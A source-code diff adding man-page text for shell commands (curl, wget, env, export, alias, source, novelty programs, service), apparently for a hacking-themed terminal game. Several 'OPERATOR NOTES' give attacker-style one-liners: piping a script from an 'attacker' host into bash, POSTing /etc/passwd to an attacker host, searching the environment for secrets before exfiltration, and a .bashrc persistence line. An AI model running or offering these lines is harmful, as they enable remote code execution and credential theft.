+SYNOPSIS
+       unzip [-Z] [-cflptTuvz] [-P password] file[.zip] [file(s)...] [-d dir]
+
+DESCRIPTION
+       unzip will list, test, or extract files from a ZIP archive.
+
+OPTIONS
+       -l     List archive contents.
+
+       -v     List archive contents with verbose info.
+
+       -t     Test archive integrity.
+
+       -d dir
+              Extract files into specified directory.
+
+       -o     Overwrite files without prompting.
+
+       -n     Never overwrite existing files.
+
+       -P password
+              Use password to decrypt encrypted archive.
+
+       -q     Quiet mode.
+
+       file(s)
+              Extract only specified files (supports wildcards).
+
+EXAMPLES
+       unzip archive.zip
+              Extract all files to current directory.
+
+       unzip archive.zip -d /tmp/
+              Extract to specific directory.
+
+       unzip -l archive.zip
+              List contents without extracting.
+
+       unzip -t archive.zip
+              Test archive integrity.
+
+       unzip archive.zip "*.txt"
+              Extract only .txt files.
+
+       unzip -P secret encrypted.zip
+              Extract password-protected archive.
+
+       unzip -o archive.zip
+              Extract and overwrite without asking.
+
+OPERATOR NOTES
+       Use unzip when you need to:
+       • Extract downloaded tools/exploits
+       • Unpack archived data
+       • List contents before extracting (always do this!)
+
+       Pro tip: Always list before extracting:
+       unzip -l suspicious.zip        # Check contents first
+       unzip suspicious.zip -d /tmp/  # Extract to safe location
+
+       Zip bombs exist! Check uncompressed size before extracting:
+       unzip -l bomb.zip | tail -1    # Check total size
+
+SEE ALSO
+       zip(1), tar(1), gunzip(1)`,
+
+            'curl': `CURL(1)                           User Commands                        CURL(1)
+
+NAME
+       curl - transfer a URL
+
+SYNOPSIS
+       curl [options] [URL...]
+
+DESCRIPTION
+       curl is a tool to transfer data from or to a server, using one of
+       the supported protocols (HTTP, HTTPS, FTP, SFTP, etc.).
+
+COMMON OPTIONS
+       -o, --output <file>
+              Write output to file instead of stdout
+
+       -O, --remote-name
+              Write output to file named like the remote file
+
+       -s, --silent
+              Silent mode (no progress or errors)
+
+       -v, --verbose
+              Make operation more verbose
+
+       -L, --location
+              Follow redirects
+
+       -k, --insecure
+              Allow insecure SSL connections
+
+       -X, --request <method>
+              Specify request method (GET, POST, PUT, DELETE)
+
+       -d, --data <data>
+              Send data in POST request
+
+       -H, --header <header>
+              Add header to request
+
+       -u, --user <user:password>
+              Server user and password
+
+       -x, --proxy <host:port>
+              Use proxy
+
+EXAMPLES
+       curl http://example.com
+              Fetch webpage.
+
+       curl -O http://example.com/file.zip
+              Download file keeping remote name.
+
+       curl -o output.html http://example.com
+              Download to specific filename.
+
+       curl -X POST -d "user=admin&pass=test" http://site/login
+              POST form data.
+
+       curl -H "Authorization: Bearer TOKEN" http://api/data
+              Request with custom header.
+
+       curl -u admin:password http://site/admin
+              Basic authentication.
+
+OPERATOR NOTES
+       Use curl when you need to:
+       • Download tools/exploits to target
+       • Interact with APIs and web services
+       • Test web vulnerabilities
+       • Exfiltrate data via HTTP
+
+       Pro tip: Download and execute (use carefully):
+       curl http://attacker/script.sh | bash
+
+       Exfil via POST:
+       curl -X POST -d @/etc/passwd http://attacker/collect
+
+       Check for SSRF: curl internal-service:port from target
+
+SEE ALSO
+       wget(1), fetch(1)`,
+
+            'wget': `WGET(1)                         User Commands                        WGET(1)
+
+NAME
+       wget - non-interactive network downloader
+
+SYNOPSIS
+       wget [option]... [URL]...
+
+DESCRIPTION
+       GNU Wget is a free utility for non-interactive download of files
+       from the Web. It supports HTTP, HTTPS, and FTP protocols.
+
+COMMON OPTIONS
+       -O, --output-document=FILE
+              Write documents to FILE
+
+       -q, --quiet
+              Turn off output
+
+       -v, --verbose
+              Turn on verbose output
+
+       -c, --continue
+              Resume partial download
+
+       -r, --recursive
+              Turn on recursive retrieving
+
+       --no-check-certificate
+              Don't check SSL certificate
+
+       -P, --directory-prefix=PREFIX
+              Save files to directory PREFIX
+
+       --user=USER --password=PASS
+              Set HTTP username and password
+
+EXAMPLES
+       wget http://example.com/file.zip
+              Download file.
+
+       wget -O output.zip http://example.com/file.zip
+              Download with specific name.
+
+       wget -q http://example.com/script.sh
+              Quiet download.
+
+       wget -c http://example.com/large.iso
+              Resume interrupted download.
+
+       wget --no-check-certificate https://site/file
+              Skip SSL verification.
+
+OPERATOR NOTES
+       Use wget when you need to:
+       • Download tools to target system
+       • Mirror websites for offline analysis
+       • Retrieve files non-interactively (scripts)
+
+       Pro tip: wget vs curl:
+       wget - better for downloading files, has resume
+       curl - better for API interaction, more protocols
+
+       Download and execute:
+       wget -qO- http://attacker/script.sh | bash
+
+       Recursive site grab:
+       wget -r -l 2 http://target/  (2 levels deep)
+
+SEE ALSO
+       curl(1)`,
+
             // Package management
             'apt': `APT(8)                                APT                               APT(8)
 
@@ -8001,6 +10598,565 @@ OPERATOR NOTES
 SEE ALSO
        printf(1)`,
 
+            'env': `ENV(1)                          User Commands                         ENV(1)
+
+NAME
+       env - run a program in a modified environment
+
+SYNOPSIS
+       env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...]
+
+DESCRIPTION
+       Set each NAME to VALUE in the environment and run COMMAND.
+       With no COMMAND, print the resulting environment.
+
+OPTIONS
+       -i, --ignore-environment
+              Start with an empty environment.
+
+       -u, --unset=NAME
+              Remove variable from the environment.
+
+EXAMPLES
+       env
+              Print all environment variables.
+
+       env | grep PATH
+              Show PATH variable.
+
+       env -i /bin/bash
+              Start bash with clean environment.
+
+       env VAR=value command
+              Run command with VAR set.
+
+       env -u HISTFILE bash
+              Start bash without history file.
+
+OPERATOR NOTES
+       Use env when you need to:
+       • View all environment variables (credentials, paths, configs)
+       • Run commands with modified environment
+       • Start clean shell without history
+
+       Pro tip: Environment variables often contain secrets:
+       env | grep -iE "(pass|key|token|secret|api)"
+
+       Check for sensitive data in environment before exfiltration.
+
+SEE ALSO
+       export(1), printenv(1), set(1)`,
+
+            'export': `EXPORT(1)                     Bash Builtins                      EXPORT(1)
+
+NAME
+       export - set export attribute for shell variables
+
+SYNOPSIS
+       export [-fn] [name[=value] ...]
+       export -p
+
+DESCRIPTION
+       Mark each name to be passed to child processes in the environment.
+       If a value is given, assign the value before exporting.
+
+OPTIONS
+       -f     Names refer to functions.
+
+       -n     Remove the export property from each name.
+
+       -p     Display all exported variables and functions.
+
+EXAMPLES
+       export PATH=$PATH:/opt/bin
+              Add /opt/bin to PATH.
+
+       export EDITOR=vim
+              Set default editor.
+
+       export -p
+              List all exported variables.
+
+       export VAR="value"
+              Create and export in one step.
+
+       export -n VAR
+              Unexport a variable.
+
+OPERATOR NOTES
+       Use export when you need to:
+       • Modify PATH to include your tools directory
+       • Set environment for child processes
+       • Configure shell behavior
+
+       Pro tip: Persistence via .bashrc:
+       echo 'export PATH=$PATH:/tmp/.tools' >> ~/.bashrc
+
+       Check what's exported: export -p | grep -v "^declare"
+
+SEE ALSO
+       env(1), set(1), unset(1)`,
+
+            'alias': `ALIAS(1)                      Bash Builtins                       ALIAS(1)
+
+NAME
+       alias - define or display aliases
+
+SYNOPSIS
+       alias [-p] [name[=value] ...]
+
+DESCRIPTION
+       Without arguments, alias prints the list of aliases.
+       With arguments, an alias is defined for each name whose value is given.
+
+OPTIONS
+       -p     Print all aliases in a reusable format.
+
+EXAMPLES
+       alias
+              Show all defined aliases.
+
+       alias ll='ls -la'
+              Create alias for long listing.
+
+       alias grep='grep --color=auto'
+              Add color to grep.
+
+       alias rm='rm -i'
+              Make rm interactive (safety).
+
+       unalias ll
+              Remove an alias.
+
+COMMON USEFUL ALIASES
+       alias ll='ls -la'
+       alias la='ls -A'
+       alias ..='cd ..'
+       alias ...='cd ../..'
+       alias grep='grep --color=auto'
+       alias h='history'
+       alias c='clear'
+
+OPERATOR NOTES
+       Use alias when you need to:
+       • Create shortcuts for long commands
+       • Check for malicious aliases (hijacked commands!)
+       • Set up your working environment
+
+       Pro tip: SECURITY CHECK - Malicious aliases!
+       alias           # Check what's defined
+       type ls         # Verify ls is really /bin/ls
+       \\ls             # Bypass alias, run real command
+
+       Attackers may alias common commands to hide activity:
+       alias ls='ls --ignore=backdoor.sh'
+       alias cat='cat | tee /tmp/.log'
+
+SEE ALSO
+       unalias(1), type(1), which(1)`,
+
+            'source': `SOURCE(1)                     Bash Builtins                      SOURCE(1)
+
+NAME
+       source, . - execute commands from a file in the current shell
+
+SYNOPSIS
+       source filename [arguments]
+       . filename [arguments]
+
+DESCRIPTION
+       Read and execute commands from filename in the current shell
+       environment. The . (dot) command is a synonym for source.
+
+       Unlike running a script directly (which starts a subshell),
+       source runs in the current shell, so variable changes persist.
+
+EXAMPLES
+       source ~/.bashrc
+              Reload bash configuration.
+
+       . /etc/profile
+              Load system profile.
+
+       source script.sh
+              Run script in current shell (variables persist).
+
+       source <(curl -s http://example.com/script.sh)
+              Source from URL (DANGEROUS!).
+
+DIFFERENCE FROM EXECUTION
+       ./script.sh    Runs in subshell, changes don't persist
+       source script.sh   Runs in current shell, changes persist
+
+       Example:
+       # script.sh contains: export VAR="hello"
+       ./script.sh && echo $VAR    # Empty - subshell
+       source script.sh && echo $VAR  # "hello" - current shell
+
+OPERATOR NOTES
+       Use source when you need to:
+       • Reload configuration without restarting shell
+       • Load environment variables from files
+       • Run setup scripts that modify current environment
+
+       Pro tip: source can be dangerous - it executes arbitrary code
+       in your current shell with your privileges.
+
+       Never: source <(curl http://untrusted/script)
+
+SEE ALSO
+       bash(1), sh(1), exec(1)`,
+
+            'clear': `CLEAR(1)                        User Commands                       CLEAR(1)
+
+NAME
+       clear - clear the terminal screen
+
+SYNOPSIS
+       clear
+
+DESCRIPTION
+       clear clears your screen if this is possible, including its
+       scrollback buffer.
+
+EXAMPLES
+       clear
+              Clear the terminal screen.
+
+       Ctrl+L
+              Keyboard shortcut (same effect).
+
+       clear && ls
+              Clear then list directory.
+
+OPERATOR NOTES
+       Use clear when you need to:
+       • Clean up terminal for better visibility
+       • Hide previous command output from shoulder surfers
+       • Reset terminal display issues
+
+       Pro tip: Ctrl+L is faster than typing clear.
+       Note: clear doesn't delete history, just clears display.
+
+SEE ALSO
+       reset(1), tput(1)`,
+
+            'date': `DATE(1)                         User Commands                        DATE(1)
+
+NAME
+       date - print or set the system date and time
+
+SYNOPSIS
+       date [OPTION]... [+FORMAT]
+       date [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]
+
+DESCRIPTION
+       Display the current time in the given FORMAT, or set the system date.
+
+FORMAT CODES
+       %Y     Year (4 digits)
+       %m     Month (01-12)
+       %d     Day of month (01-31)
+       %H     Hour (00-23)
+       %M     Minute (00-59)
+       %S     Second (00-60)
+       %F     Full date (same as %Y-%m-%d)
+       %T     Time (same as %H:%M:%S)
+       %s     Seconds since epoch (Unix timestamp)
+       %Z     Timezone name
+
+EXAMPLES
+       date
+              Show current date and time.
+
+       date +%F
+              Show date as YYYY-MM-DD.
+
+       date +"%Y%m%d_%H%M%S"
+              Timestamp for filenames.
+
+       date +%s
+              Unix timestamp (seconds since 1970).
+
+       date -d "2 days ago"
+              Show date from 2 days ago.
+
+       date -d @1234567890
+              Convert Unix timestamp to date.
+
+       date -u
+              Show UTC time.
+
+OPERATOR NOTES
+       Use date when you need to:
+       • Generate timestamps for logs or filenames
+       • Check system time (for log correlation)
+       • Convert Unix timestamps
+
+       Pro tip: Useful patterns:
+       date +%Y%m%d_%H%M%S         # 20240115_143022
+       date -d "yesterday" +%F     # Yesterday's date
+       Log files often use: date +"%b %d %H:%M:%S"
+
+SEE ALSO
+       time(1), hwclock(8), timedatectl(1)`,
+
+            'which': `WHICH(1)                        User Commands                       WHICH(1)
+
+NAME
+       which - locate a command
+
+SYNOPSIS
+       which [-a] filename ...
+
+DESCRIPTION
+       which returns the pathnames of the files (or links) which would
+       be executed in the current environment.
+
+OPTIONS
+       -a     Print all matching pathnames of each argument.
+
+EXAMPLES
+       which python
+              Find where python is located.
+
+       which -a python
+              Find all python executables in PATH.
+
+       which ls cd pwd
+              Check multiple commands.
+
+OPERATOR NOTES
+       Use which when you need to:
+       • Find the full path to a command
+       • Verify which version of a tool will run
+       • Check if a command exists
+
+       Pro tip: which only searches PATH. For complete info:
+       type command    # Shows if alias, function, or file
+       command -v cmd  # POSIX way to find command
+       whereis cmd     # Finds binary, source, and man pages
+
+       Security check: Verify commands are from expected locations.
+       which sudo      # Should be /usr/bin/sudo, not /tmp/sudo
+
+SEE ALSO
+       type(1), whereis(1), command(1)`,
+
+            'whereis': `WHEREIS(1)                      User Commands                      WHEREIS(1)
+
+NAME
+       whereis - locate the binary, source, and manual page for a command
+
+SYNOPSIS
+       whereis [options] name...
+
+DESCRIPTION
+       whereis locates the binary, source and manual files for the
+       specified command names.
+
+OPTIONS
+       -b     Search only for binaries.
+
+       -m     Search only for manual pages.
+
+       -s     Search only for sources.
+
+EXAMPLES
+       whereis ls
+              Find binary, source, and man page for ls.
+
+       whereis -b python
+              Find only python binary.
+
+       whereis -m grep
+              Find only grep man pages.
+
+OUTPUT FORMAT
+       ls: /bin/ls /usr/share/man/man1/ls.1.gz
+       |   |       |
+       cmd binary  man page
+
+OPERATOR NOTES
+       Use whereis when you need to:
+       • Find all locations of a command
+       • Locate man pages
+       • Verify command locations
+
+       Pro tip: whereis vs which vs type:
+       which     - First match in PATH only
+       whereis   - Binary, source, and man pages
+       type      - Tells if alias, function, builtin, or file
+
+SEE ALSO
+       which(1), type(1), locate(1)`,
+
+            'type': `TYPE(1)                       Bash Builtins                        TYPE(1)
+
+NAME
+       type - display information about command type
+
+SYNOPSIS
+       type [-afptP] name [name ...]
+
+DESCRIPTION
+       For each name, indicate how it would be interpreted if used as a
+       command name.
+
+OPTIONS
+       -t     Print a single word: alias, keyword, function, builtin, or file.
+
+       -p     Print the file path (only for external commands).
+
+       -a     Print all locations containing an executable named name.
+
+       -f     Suppress shell function lookup.
+
+EXAMPLES
+       type ls
+              "ls is /bin/ls" or "ls is aliased to..."
+
+       type -t ls
+              Just print: file, alias, builtin, function, or keyword
+
+       type cd
+              "cd is a shell builtin"
+
+       type -a python
+              Show all python executables.
+
+       type ll
+              Might show "ll is aliased to 'ls -l'"
+
+OPERATOR NOTES
+       Use type when you need to:
+       • Check if command is alias, builtin, or file
+       • Detect aliased commands (security check!)
+       • Find all versions of a command
+
+       Pro tip: SECURITY - Detect malicious aliases:
+       type ls         # Is it really /bin/ls?
+       type sudo       # Is it really /usr/bin/sudo?
+       type -a cat     # Any unexpected locations?
+
+       Attackers may create aliases or scripts in PATH to intercept commands.
+
+SEE ALSO
+       which(1), whereis(1), alias(1)`,
+
+            'chgrp': `CHGRP(1)                        User Commands                       CHGRP(1)
+
+NAME
+       chgrp - change group ownership
+
+SYNOPSIS
+       chgrp [OPTION]... GROUP FILE...
+       chgrp [OPTION]... --reference=RFILE FILE...
+
+DESCRIPTION
+       Change the group of each FILE to GROUP.
+
+OPTIONS
+       -R, --recursive
+              Operate on files and directories recursively.
+
+       -v, --verbose
+              Output a diagnostic for every file processed.
+
+       -c, --changes
+              Like verbose but report only when a change is made.
+
+       --reference=RFILE
+              Use RFILE's group rather than specifying a GROUP value.
+
+EXAMPLES
+       chgrp developers file.txt
+              Change group to developers.
+
+       chgrp -R www-data /var/www
+              Recursively change group.
+
+       chgrp --reference=ref.txt target.txt
+              Copy group from ref.txt.
+
+OPERATOR NOTES
+       Use chgrp when you need to:
+       • Fix group ownership for web files
+       • Grant group access to files
+       • Match group to existing files
+
+       Pro tip: Common group patterns:
+       www-data   - Web server files
+       docker     - Docker socket access
+       sudo       - Sudoers group
+
+       chgrp requires membership in target group (or root).
+
+SEE ALSO
+       chmod(1), chown(1), groups(1)`,
+
+            'watch': `WATCH(1)                        User Commands                       WATCH(1)
+
+NAME
+       watch - execute a program periodically, showing output fullscreen
+
+SYNOPSIS
+       watch [options] command
+
+DESCRIPTION
+       watch runs command repeatedly, displaying its output. This allows
+       you to watch the program output change over time.
+
+OPTIONS
+       -n, --interval seconds
+              Specify update interval. Default is 2 seconds.
+
+       -d, --differences
+              Highlight the differences between successive updates.
+
+       -t, --no-title
+              Turn off the header showing interval and command.
+
+       -c, --color
+              Interpret ANSI color sequences.
+
+       -e, --errexit
+              Exit if command has a non-zero exit.
+
+EXAMPLES
+       watch date
+              Watch the time update every 2 seconds.
+
+       watch -n 1 "ps aux | grep nginx"
+              Monitor nginx processes every second.
+
+       watch -d ls -l
+              Watch directory, highlight changes.
+
+       watch -n 5 df -h
+              Monitor disk space every 5 seconds.
+
+       watch "tail -20 /var/log/syslog"
+              Monitor log file.
+
+OPERATOR NOTES
+       Use watch when you need to:
+       • Monitor changing data in real-time
+       • Watch for file changes
+       • Monitor process status
+       • Track network connections
+
+       Pro tip: Useful monitoring commands:
+       watch -n 1 'netstat -an | grep ESTABLISHED'
+       watch -n 5 'df -h'
+       watch -d 'ls -la /tmp'
+       watch -n 1 'cat /proc/loadavg'
+
+       Press Ctrl+C to exit watch.
+
+SEE ALSO
+       tail(1), top(1)`,
+
             'history': `HISTORY(1)                   Bash Builtins                       HISTORY(1)
 
 NAME
@@ -8177,7 +11333,944 @@ EXAMPLES
            Tune to 161.7 MHz (same as tune 161.7).
 
 SEE ALSO
-       scan(1), tune(1)`
+       scan(1), tune(1)`,
+
+            // ═══════════════════════════════════════════════════════════════
+            // EASTER EGGS
+            // ═══════════════════════════════════════════════════════════════
+
+            'sl': `SL(1)                           User Commands                          SL(1)
+
+NAME
+       sl - cure your bad strokes
+
+SYNOPSIS
+       sl [-alFe]
+
+DESCRIPTION
+       sl is a highly advanced animation program for curing your bad habit
+       of mistyping 'ls'. When you accidentally type 'sl' instead of 'ls',
+       you'll be treated to a steam locomotive animation as a reminder
+       to type more carefully.
+
+       sl is not a game. sl is a lesson.
+
+OPTIONS
+       -a     An accident is shown. You'll see people crying for help.
+
+       -l     Little version (no animation).
+
+       -F     Flying locomotive (it flies across the sky!).
+
+       -e     Allow interrupt by Ctrl+C (normally you must watch the
+              entire train pass as your punishment).
+
+EXAMPLES
+       sl
+              Watch the train. Learn your lesson.
+
+HISTORY
+       Written by Toyoda Masashi as a joke/reminder program in 1993.
+       Originally for UNIX systems, now a classic Easter egg installed
+       on many Linux distributions.
+
+       "If you mistype, you must watch the train. There is no escape."
+
+OPERATOR NOTES
+       If you see the sl train, you typed 'sl' instead of 'ls'.
+       Take a breath. Watch the train. Be more careful next time.
+
+       Install on real Linux: sudo apt install sl
+
+SEE ALSO
+       ls(1), cowsay(1), fortune(6)`,
+
+            'cowsay': `COWSAY(1)                       User Commands                       COWSAY(1)
+
+NAME
+       cowsay - configurable speaking/thinking cow (and other animals)
+
+SYNOPSIS
+       cowsay [-e eye_string] [-f cowfile] [-l] [-n] [-T tongue_string]
+              [-W column] [-bdgpstwy] [message]
+
+DESCRIPTION
+       Cowsay generates an ASCII picture of a cow saying something provided
+       by the user. If no message is provided on the command line, it reads
+       from standard input.
+
+OPTIONS
+       -f cowfile
+              Use specified cow file. Examples: tux, dragon, elephant
+
+       -l     List all available cowfiles.
+
+       -e eye_string
+              Set custom eye string (2 chars).
+
+       -T tongue_string
+              Set custom tongue string.
+
+       -b     Borg mode (eyes = ==).
+
+       -d     Dead cow (eyes = xx).
+
+       -g     Greedy cow (eyes = $$).
+
+       -p     Paranoid cow (eyes = @@).
+
+       -s     Stoned cow (eyes = **).
+
+       -t     Tired cow (eyes = --).
+
+       -w     Wired cow (eyes = OO).
+
+       -y     Youthful cow (eyes = ..).
+
+EXAMPLES
+       cowsay "Hello World"
+              Basic cow greeting.
+
+       cowsay -f tux "Linux rules"
+              Tux the penguin speaks.
+
+       fortune | cowsay
+              Random fortune from a cow.
+
+       cowsay -d "I'm not dead yet"
+              Dead cow in denial.
+
+HISTORY
+       Created by Tony Monroe in 1999. cowsay is one of the most beloved
+       Unix Easter eggs and has inspired countless variations including
+       cowthink (thinking bubble), and hundreds of custom cowfiles.
+
+OPERATOR NOTES
+       Use cowsay when you need to:
+       • Lighten the mood during long terminal sessions
+       • Make documentation more entertaining
+       • Annoy your coworkers with ASCII art
+
+       Install on real Linux: sudo apt install cowsay
+
+SEE ALSO
+       fortune(6), figlet(6), sl(1)`,
+
+            'fortune': `FORTUNE(6)                      Games Manual                       FORTUNE(6)
+
+NAME
+       fortune - print a random, hopefully interesting, adage
+
+SYNOPSIS
+       fortune [-aefilo] [-n length] [-m pattern] [file/directory]
+
+DESCRIPTION
+       When fortune is run with no arguments it prints out a random epigram.
+       Epigrams are divided into several categories.
+
+OPTIONS
+       -a     Choose from all databases.
+
+       -e     Consider all fortune files equal.
+
+       -o     Choose only offensive fortunes (where available).
+
+       -s     Short fortunes only (<160 characters).
+
+       -l     Long fortunes only.
+
+FORTUNE FILES
+       fortunes       General quotes and sayings
+       computers      Tech and programming humor
+       literature     Literary quotes
+       riddles        Riddles and puzzles
+       offensive      Adult/offensive content (if installed)
+
+EXAMPLES
+       fortune
+              Print a random fortune.
+
+       fortune computers
+              Print a computer-related fortune.
+
+       fortune -s
+              Print a short fortune.
+
+       fortune | cowsay
+              Fortune from a cow!
+
+SAMPLE FORTUNES
+       "There's no place like 127.0.0.1"
+       "chmod 777 is not a security strategy"
+       "Have you tried turning it off and on again?"
+       "It works on my machine!"
+
+OPERATOR NOTES
+       Use fortune when you need to:
+       • Break the tension during long debugging sessions
+       • Start your terminal with a random thought
+       • Add wisdom to your MOTD
+
+       Add to .bashrc: fortune  (see a fortune on each new shell)
+
+       Install on real Linux: sudo apt install fortune-mod
+
+SEE ALSO
+       cowsay(1), figlet(6), ddate(1)`,
+
+            'figlet': `FIGLET(6)                       Games Manual                       FIGLET(6)
+
+NAME
+       figlet - display large characters made up of ordinary screen characters
+
+SYNOPSIS
+       figlet [-cklnoprstvxDELNRSWX] [-d fontdirectory] [-f fontfile]
+              [-m layoutmode] [-w outputwidth] [-C controlfile]
+              [-I infocode] [message]
+
+DESCRIPTION
+       FIGlet prints its input using large characters (called "FIG characters")
+       made up of ordinary screen characters (called "sub-characters").
+       FIGlet output is generally reminiscent of the banner program.
+
+OPTIONS
+       -f font
+              Use specified font file.
+
+       -w width
+              Set output width.
+
+       -c     Center output.
+
+       -l     Left-justify output.
+
+       -r     Right-justify output.
+
+COMMON FONTS
+       standard       Default font
+       banner         Large block letters
+       big            Bigger letters
+       block          Solid block letters
+       bubble         Bubble letters
+       digital        LED-style letters
+       lean           Thin letters
+       mini           Small letters
+       script         Script/cursive style
+       shadow         Letters with shadow
+       slant          Slanted letters
+
+EXAMPLES
+       figlet Hello
+              Print "Hello" in large ASCII art.
+
+       figlet -f slant "HACK"
+              Print "HACK" in slanted font.
+
+       figlet -c -w 80 "ALERT"
+              Centered alert banner.
+
+       echo "Warning" | figlet
+              Pipe text to figlet.
+
+OUTPUT EXAMPLE
+       $ figlet Hi
+       _   _ _
+      | | | (_)
+      | |_| |_
+      |  _  | |
+      |_| |_|_|
+
+OPERATOR NOTES
+       Use figlet when you need to:
+       • Create ASCII banners for scripts
+       • Make your terminal output impressive
+       • Add flair to MOTD or documentation
+
+       Install on real Linux: sudo apt install figlet
+
+SEE ALSO
+       banner(1), toilet(1), cowsay(1)`,
+
+            'cmatrix': `CMATRIX(1)                      User Commands                      CMATRIX(1)
+
+NAME
+       cmatrix - simulates the display from "The Matrix"
+
+SYNOPSIS
+       cmatrix [-abBflohnsuV] [-C color] [-s] [-u update_delay]
+
+DESCRIPTION
+       cmatrix shows text flying in and out in a terminal, similar to
+       The Matrix movie. It operates in text mode and can display using
+       a variety of fonts.
+
+OPTIONS
+       -a     Asynchronous scroll.
+
+       -b     Bold characters on.
+
+       -B     All bold characters.
+
+       -f     Force Linux $TERM type.
+
+       -l     Linux mode (requires root).
+
+       -o     Use old-style scrolling.
+
+       -s     Screensaver mode.
+
+       -u delay
+              Update delay (0-9, default 4).
+
+       -C color
+              Use specified color (green, red, blue, white, yellow,
+              cyan, magenta, black).
+
+EXAMPLES
+       cmatrix
+              Start Matrix rain animation.
+
+       cmatrix -B -C green
+              All bold, green (classic Matrix look).
+
+       cmatrix -s
+              Screensaver mode (quits on keypress).
+
+       cmatrix -u 2
+              Faster scroll speed.
+
+KEYBOARD
+       q      Quit cmatrix.
+       Ctrl+C Interrupt and exit.
+       0-9    Adjust speed.
+
+CULTURAL NOTE
+       Inspired by the 1999 film "The Matrix", the green cascading
+       characters have become an iconic representation of "hacking"
+       in popular culture. Real hacking looks nothing like this.
+
+OPERATOR NOTES
+       Use cmatrix when you need to:
+       • Impress non-technical observers
+       • Pretend you're in a movie
+       • Have a cool screensaver
+
+       Install on real Linux: sudo apt install cmatrix
+
+SEE ALSO
+       sl(1), hollywood(1), cowsay(1)`,
+
+            'lolcat': `LOLCAT(6)                       Games Manual                       LOLCAT(6)
+
+NAME
+       lolcat - rainbow coloring for text
+
+SYNOPSIS
+       lolcat [options] [files...]
+
+DESCRIPTION
+       lolcat concatenates files (or standard input) to standard output,
+       adding rainbow coloring to the text. It's like cat, but with
+       fabulous rainbow colors.
+
+OPTIONS
+       -a, --animate
+              Enable animation mode.
+
+       -d, --duration
+              Animation duration.
+
+       -s, --speed
+              Animation speed.
+
+       -f, --freq
+              Rainbow frequency (default: 0.1).
+
+       -p, --spread
+              Rainbow spread (default: 3.0).
+
+       -F, --force
+              Force color even when stdout is not a tty.
+
+       -v, --version
+              Show version.
+
+EXAMPLES
+       echo "Hello World" | lolcat
+              Rainbow text.
+
+       cat file.txt | lolcat
+              Rainbow file contents.
+
+       figlet "HELLO" | lolcat
+              Rainbow ASCII art!
+
+       fortune | cowsay | lolcat
+              The ultimate combo.
+
+       ls -la | lolcat
+              Even ls can be fabulous.
+
+OPERATOR NOTES
+       Use lolcat when you need to:
+       • Add color to boring terminal output
+       • Make your scripts more festive
+       • Annoy people who prefer minimalism
+
+       Install on real Linux: sudo apt install lolcat (or gem install lolcat)
+
+SEE ALSO
+       cat(1), cowsay(1), figlet(6)`,
+
+            'hollywood': `HOLLYWOOD(1)                    User Commands                    HOLLYWOOD(1)
+
+NAME
+       hollywood - fill your console with Hollywood melodrama technobabble
+
+SYNOPSIS
+       hollywood
+
+DESCRIPTION
+       hollywood creates a fake "hacking" display that looks like something
+       from a movie. It splits the terminal into multiple panes showing
+       various streams of data, hex dumps, code, and other "computery"
+       looking things.
+
+       This is purely for entertainment. Real security work involves
+       reading logs, searching files, and drinking coffee - not watching
+       colorful animations while dramatically saying "I'm in."
+
+FEATURES
+       • Multiple split panes with fake data streams
+       • Scrolling hexadecimal dumps
+       • Fake compile/download progress bars
+       • Random "ACCESS GRANTED" messages
+       • Dramatic sound effects (if enabled)
+
+USAGE
+       Just run 'hollywood' and watch the show.
+       Press Ctrl+C (multiple times) to exit.
+
+MOVIE HACKING VS REAL HACKING
+       ┌──────────────────────────────────────────────────────────────┐
+       │              MOVIE HACKING       │       REAL HACKING        │
+       ├──────────────────────────────────────────────────────────────┤
+       │  3D flying through cyberspace   │  grep -r "password" /var  │
+       │  "I'm bypassing the mainframe"  │  "Let me check the logs"  │
+       │  Dramatic music intensifies     │  Coffee machine intensifies│
+       │  Two people on one keyboard     │  One person, five tabs    │
+       │  Done in 30 seconds             │  Done in 30 hours maybe   │
+       │  "I'm in!"                      │  "Permission denied"      │
+       └──────────────────────────────────────────────────────────────┘
+
+OPERATOR NOTES
+       Use hollywood when you need to:
+       • Impress your non-technical friends
+       • Pretend you're in a 90s hacker movie
+       • Take a break from actual work
+
+       Install on real Linux: sudo apt install hollywood
+
+SEE ALSO
+       cmatrix(1), sl(1), cowsay(1)`,
+
+            'yes': `YES(1)                          User Commands                         YES(1)
+
+NAME
+       yes - output a string repeatedly until killed
+
+SYNOPSIS
+       yes [STRING]...
+
+DESCRIPTION
+       Repeatedly output a line with all specified STRING(s), or 'y'.
+
+       --help  display help and exit
+       --version output version information and exit
+
+EXAMPLES
+       yes
+              Output 'y' forever (or until Ctrl+C).
+
+       yes no
+              Output 'no' forever.
+
+       yes "I agree" | head -5
+              Output "I agree" 5 times.
+
+       yes | rm -i *.tmp
+              Auto-confirm all deletion prompts.
+
+PRACTICAL USES
+       Auto-accept prompts:
+              yes | apt-get install package
+
+       Fill disk (testing):
+              yes "test" > /dev/null &
+
+       Stress test:
+              yes > /dev/null &
+
+       Generate test data:
+              yes "test line" | head -1000 > testfile.txt
+
+WARNING
+       yes without redirection or piping will flood your terminal
+       indefinitely. Use Ctrl+C to stop it.
+
+OPERATOR NOTES
+       Use yes when you need to:
+       • Auto-accept interactive prompts in scripts
+       • Generate test data quickly
+       • Stress test systems (carefully)
+
+       Pro tip: yes | command auto-answers "y" to all prompts.
+       Useful for batch operations: yes | apt-get install -y package
+
+SEE ALSO
+       true(1), false(1), head(1)`,
+
+            // ═══════════════════════════════════════════════════════════════
+            // SYSTEM ADMINISTRATION
+            // ═══════════════════════════════════════════════════════════════
+
+            'service': `SERVICE(8)                      System Administration                  SERVICE(8)
+
+NAME
+       service - run a System V init script
+
+SYNOPSIS
+       service SCRIPT COMMAND [OPTIONS]
+       service --status-all
+
+DESCRIPTION
+       service runs a System V init script or systemd unit in as predictable
+       an environment as possible, removing most environment variables and
+       with the current working directory set to /.
+
+       SCRIPT is the name of the init script in /etc/init.d/ (without .sh
+       extension) or the systemd service name.
+
+       COMMAND can be at least start, stop, status, and restart.
+
+COMMANDS
+       start   Start the service.
+       stop    Stop the service.
+       restart Restart the service (stop then start).
+       reload  Reload configuration without full restart.
+       status  Show current status of the service.
+
+OPTIONS
+       --status-all
+              Run all init scripts with the status command.
+
+EXAMPLES
+       service ssh status
+              Check SSH daemon status.
+
+       service apache2 restart
+              Restart Apache web server.
+
+       service --status-all
+              Show status of all services.
+
+       service cron start
+              Start the cron daemon.
+
+       service nginx reload
+              Reload Nginx configuration.
+
+OPERATOR NOTES
+       Use service when you need to:
+       • Start/stop/restart system services
+       • Check if a service is running
+       • Reload service configuration after changes
+       • Audit what services are active on a system
